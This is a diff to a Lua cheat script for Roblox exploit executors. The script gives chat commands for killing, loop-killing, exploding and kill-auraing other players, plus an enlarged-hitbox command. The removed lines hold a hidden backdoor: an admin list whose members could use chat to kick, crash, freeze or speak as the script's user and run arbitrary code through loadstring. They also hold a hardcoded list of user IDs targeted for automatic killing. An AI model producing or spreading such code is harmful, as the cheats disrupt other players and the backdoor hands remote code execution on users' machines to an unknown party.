@@ -13,19 +13,16 @@ local VirtualUser          = game:GetService("VirtualUser")
 local LocalPlayer          = Players.LocalPlayer
 local PlayerGui            = LocalPlayer:WaitForChild("PlayerGui", 5)
 local BlindGuisTable       = { ScreenFog = true, DarknessGui = true, VolleyballScreenGui = true, FlashBangEffect = true }
-local TrueAdminList        = {}
 local LocalPlayerWhiteList = { LocalPlayer.UserId }
 local LoopkillList         = {}
 local LoopGodList          = {}
 local whitelist            = {}
 local FFkillList           = {}
-local blackListKillTable   = {2214980020, 57793279, 678337052, 8507091703, 3260559291, 8363671666, 204206963 }
 local saveList             = {}
 local RocketList           = {}
 local loopkillRejoinProof  = {}
 local baseProtect          = {}
 local killAuraList         = {}
-local backdoor             = false
 local creator              = true
 local publicMode           = false
 local HttpRequest          = syn and syn.request or http and http.request or http_request or request or httprequest
@@ -62,13 +59,6 @@ StarterGui:SetCore("SendNotification", {
     Text = "Loading script...",
     Duration = 5,
 })
-
-local function armCheck()
-    local char = LocalPlayer.Character
-    if not char then return false end
-    local Arm = char:FindFirstChild("Left Arm")
-    return Arm ~= nil
-end
 
 local function num(str)
     if str == "inf" then
@@ -202,14 +192,13 @@ end
 
 local function TouchAndUnTouch(PartToTouch, MyTouchTransmitter)
     task.spawn(function()
-       local suc, err =  pcall(function()
+        pcall(function()
             if not (PartToTouch and MyTouchTransmitter) then return end
             firetouchinterest(PartToTouch, MyTouchTransmitter, 0)
             task.wait()
             if not (PartToTouch and MyTouchTransmitter) then return end
             firetouchinterest(PartToTouch, MyTouchTransmitter, 1)
         end)
-        if not suc then print(err) end
     end)
 end
 
@@ -622,17 +611,6 @@ local function equiptool(n)
     return Tool
 end
 
-local function unequiptool(tool)
-    local mychar = LocalPlayer.Character
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not mychar then return end
-    local sword = mychar:FindFirstChild(tool)
-    if sword then
-        if sword.Parent == mychar then
-            sword.Parent = backpack
-        end
-    end
-end
 
 local function ColorAllParts(t)
     local mychar = LocalPlayer.Character
@@ -820,7 +798,7 @@ task.spawn(function()
 end)
 
 local function checkPermisson(v)
-    return (whitelist[v] or table.find(LocalPlayerWhiteList, v) or table.find(TrueAdminList, v))
+    return (whitelist[v] or table.find(LocalPlayerWhiteList, v))
 end
 local function forLoopForList(List, func, ListToPut)
     for i = 1, #List do
@@ -840,51 +818,22 @@ local function forLoopForListUserID(List, func, ListToPut)
     end
 end
 
-local function TrueAdminCheck(UserID, Chatter, split2)
-    if not table.find(UserID) then return end
-    local targets = FindPlayers(Chatter, split2)
-    if not targets then return end
-    if #targets == 1 and targets[1] == LocalPlayer then
-        return true
-    end
-end
-local destroyList = { ["Rocket"] = true, ["Explosion"] = true }
 
+local destroyList = { ["Rocket"] = true, ["Explosion"] = true }
 local function processCommands(UserID, str)
-    local connection = nil
+    local Roocketconnection = nil
+    local PlatformConnection = nil
     local uncleanedstring = str
     local Chatter = Players:GetPlayerByUserId(UserID)
     local lowerstring = uncleanedstring:lower()
     if lowerstring:sub(1, 1) ~= prefix then return end
     local split = string.sub(lowerstring, 2):split(" ")
     local command = split[1]
-    if command == "kick" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local length = 1 + 4 + 1 + #split[2] + 1
-            local message = string.sub(uncleanedstring, length)
-            if string.sub(message, 1, 1) == " " then
-                message = string.sub(message, 2)
-            end
-            LocalPlayer:Kick(message)
-        end
-    elseif command == "loadstr" or command == "loadstring" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local length = 1 + 4 + 1 + #split[2] + 1
-            local message = string.sub(uncleanedstring, length)
-            if string.sub(message, 1, 1) == " " then
-                message = string.sub(message, 2)
-            end
-            loadstring(message)
-        end
-    elseif command == "speed" then
+    if command == "speed" then
         local targets = FindPlayers(Chatter, split[2])
         local speed = num(split[3])
         if not targets then return end
         walkspeed(targets, speed)
-    elseif command == "crash" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            repeat until false
-        end
     elseif command == "killaura" then
         local targets = FindPlayers(Chatter, split[2])
         if not targets then return end
@@ -900,80 +849,33 @@ local function processCommands(UserID, str)
         for i, v in targets do
             RemoveFromList(killAuraList, v.Name)
         end
-    elseif command == "bring" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local mychar = LocalPlayer.Character
-            local theirchar = Chatter.Character
-            if not (mychar and theirchar) then return end
-            local theirpart = theirchar:FindFirstChild("HumanoidRootPart") or theirchar:FindFirstChild("Torso") or
-                theirchar:FindFirstChild("UpperTorso")
-            if theirpart then
-                mychar:SetPrimaryPartCFrame(CFrame.new(theirpart.Position))
-            end
-        end
-    elseif command == "antiplat" then
-        while true do
-            task.wait()
+    elseif command == "antiplatform" then --may not work very expermential
+        if PlatformConnection then return end
+        PlatformConnection = RunService.Heartbeat:Connect(function()
             for i, v in pairs(Players:GetPlayers()) do
                 task.spawn(function()
                     if v ~= LocalPlayer then
                         pcall(function()
-                        local char = v.Character
-                        local root = char:FindFirstChild("HumanoidRootPart")
-                        root.Size = Vector3.new(100, 100, 100)
-                        root.Transparency = 0.5
+                            local char = v.Character
+                            local root = char:FindFirstChild("HumanoidRootPart")
+                            root.Size = Vector3.new(100, 100, 100)
+                            root.CanCollide = false
                         end)
                     end
                 end)
             end
-        end
-    elseif command == "freeze" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local mychar = LocalPlayer.Character
-            if not mychar then return end
-            for _, v in pairs(mychar:GetChildren()) do
-                if v:IsA("BasePart") then
-                    v.Anchored = true
-                end
-            end
-        end
-    elseif command == "unfreeze" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local mychar = LocalPlayer.Character
-            if not mychar then return end
-            for _, v in pairs(mychar:GetChildren()) do
-                if v:IsA("BasePart") then
-                    v.Anchored = false
-                end
-            end
-        end
-    elseif command == "delete" then
-        if not table.find(TrueAdminList, UserID) then return end
-        local targets = FindPlayers(Chatter, split[2])
-        if not targets then return end
-        for i = 1, #targets do
-            pcall(function()
-                local plr = targets[i]
-                plr:Destroy()
-            end)
-        end
-    elseif command == "chat" then
-        if TrueAdminCheck(UserID, Chatter, split[2]) then
-            local length = 1 + 4 + 1 + #split[2] + 1
-            local message = string.sub(uncleanedstring, length)
-            if string.sub(message, 1, 1) == " " then
-                message = string.sub(message, 2)
-            end
-            Chat(message)
-        end
+        end)
+    elseif command == "unantiplatform" then 
+        if not PlatformConnection then return end
+        PlatformConnection:Disconnect()
+        PlatformConnection = nil
     elseif command == "pink" then
         equiptoolandColor("Charming Blade")
     elseif command == "green" then
         equiptoolandColor("CloverHammer")
     elseif command == "gold" then
         equiptoolandColor("2018BloxyAward")
-    elseif command == "unblind" then
-        print("Stop")
+
     elseif command == "kill" then
         local targets = FindPlayers(Chatter, split[2])
         if not targets then return end
@@ -1038,17 +940,17 @@ local function processCommands(UserID, str)
         if targets then
             forLoopForList(targets, RemoveFromList, saveList)
         end
-    elseif command == "rmrockets" then
-        connection = Workspace.ChildAdded:Connect(function(v)
+    elseif command == "removerockets" then
+        Roocketconnection = Workspace.ChildAdded:Connect(function(v)
             if destroyList[v.Name] then
                 task.wait()
                 v:Remove()
             end
         end)
-    elseif command == "unrmrockets" then
-        if connection then
-            connection:Disconnect()
-            connection = nil
+    elseif command == "unremoverockets" then
+        if Roocketconnection then
+            Roocketconnection:Disconnect()
+            Roocketconnection = nil
         end
     elseif command == "loopexplode" then
         local targets = FindPlayers(Chatter, split[2])
@@ -1085,7 +987,7 @@ local function processCommands(UserID, str)
                 task.spawn(function()
                     local plr = targets[i]
                     if not checkPermisson(plr) then return end
-                    if plr.UserId == LocalPlayer.UserId and TrueAdminList[UserID] then
+                    if plr.UserId == LocalPlayer.UserId then
                         LocalPlayerWhiteList[plr.UserId] = false
                     elseif plr.UserId ~= LocalPlayer.UserId then
                         whitelist[plr.UserId] = false
@@ -1111,7 +1013,7 @@ end)
 
 local function CheckForBlackListKill(v)
     local ID = v.UserId
-    if (table.find(loopkillRejoinProof, ID) or table.find(blackListKillTable, ID)) then
+    if table.find(loopkillRejoinProof, ID) then
         insertToList(LoopkillList, v)
     end
 end
